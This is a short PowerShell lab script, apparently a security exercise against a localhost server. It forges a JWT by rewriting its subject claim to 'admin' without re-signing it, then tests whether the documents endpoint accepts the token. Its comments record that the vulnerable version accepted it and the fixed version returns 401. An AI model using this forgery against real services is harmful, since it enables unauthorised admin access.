# Не използва online decoder. Изпълнява заявки само към localhost.
$ErrorActionPreference='Stop'
. ./scripts/lab-client.ps1
$response=Invoke-RestMethod http://localhost:8080/token -Method Post -WebSession $LabSession -Headers $LabHeaders
$parts=$response.access_token.Split('.')
$base64=$parts[1].Replace('-','+').Replace('_','/')
$base64=$base64.PadRight($base64.Length + ((4-$base64.Length%4)%4),'=')
$payload=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($base64)) | ConvertFrom-Json
Write-Output "Original subject: $($payload.sub)"
$payload.sub='admin'
$json=$payload | ConvertTo-Json -Compress
$parts[1]=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json)).TrimEnd('=').Replace('+','-').Replace('/','_')
$modified=$parts -join '.'
try {
    Invoke-RestMethod http://localhost:8080/token-api/documents -Headers @{Authorization="Bearer $modified"}
} catch {
    if(-not $_.Exception.Response){throw}
    Write-Output "HTTP $([int]$_.Exception.Response.StatusCode)"
}
# lab09: subject=admin; поправен: HTTP 401. Не отпечатвайте самия token.
